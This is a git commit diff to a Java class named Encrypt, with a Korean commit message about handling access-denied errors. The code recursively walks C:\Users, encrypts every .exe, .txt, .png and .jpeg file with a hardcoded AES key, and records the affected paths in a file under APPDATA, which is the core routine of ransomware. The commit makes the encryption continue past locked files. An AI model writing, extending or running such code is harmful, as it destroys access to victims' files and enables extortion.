02c3fa67c05f3cd49ecc2744ba874b92db1e4d57
ParkMini <parkteammini@gmail.com>
2023-12-12 19:14:23 +0900

    액세스 거부 예외 처리

--- src/main/java/kr/pah/Encrypt.java
+++ src/main/java/kr/pah/Encrypt.java
@@ -4,21 +4,23 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
 import java.io.FileWriter;
+import java.nio.file.AccessDeniedException;
 import java.nio.file.Files;
 import java.util.ArrayList;
 import java.util.List;
 
 public class Encrypt {
 
-    private static final String KEY = "HelloWorldThisIsEncryptKey0x0000"; // 32Byte
+    private static final String KEY = "HelloWorldThisIsEncryptKey0x0000"; // 16자 이상의 키
     private static final String[] EXTENSIONS = new String[]{".exe", ".txt", ".png", ".jpeg"};
 
     public static void runEncryption() throws Exception {
         List<String> encryptedFiles = new ArrayList<>();
-        File root = new File("C:\\Users");
+        File root = new File("C:\\Users"); // 'C:\Users' 디렉토리 검색
 
         encryptFilesInDirectory(root, encryptedFiles);
 
+        // 암호화된 파일 경로 저장
         try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\encrypted.txt")) {
             for (String filePath : encryptedFiles) {
                 writer.write(filePath + System.lineSeparator());
@@ -35,8 +37,12 @@ public class Encrypt {
                 } else {
                     for (String extension : EXTENSIONS) {
                         if (file.getName().toLowerCase().endsWith(extension)) {
-                            encryptFile(file);
-                            encryptedFiles.add(file.getAbsolutePath());
+                            try {
+                                encryptFile(file);
+                                encryptedFiles.add(file.getAbsolutePath());
+                            } catch (AccessDeniedException e) {
+                                System.out.println("AccessDeniedException: " + file.getPath());
+                            }
                             break;
                         }
                     }
